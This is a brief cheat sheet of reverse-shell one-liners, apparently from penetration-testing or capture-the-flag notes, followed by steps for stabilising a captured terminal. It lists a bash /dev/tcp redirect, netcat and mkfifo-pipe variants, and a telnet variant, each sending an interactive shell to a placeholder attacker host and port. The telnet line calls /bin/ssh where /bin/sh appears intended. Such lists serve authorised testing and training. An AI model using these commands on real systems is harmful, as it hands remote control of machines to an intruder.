# Shells

```text
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

```text
# netcat
nc (-c/-e) /bin/sh <LHOST> <LPORT>
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/y

# telnet
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet <LHOST> <LPORT> >/tmp/y
```

### Stabilising shell

```text
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```

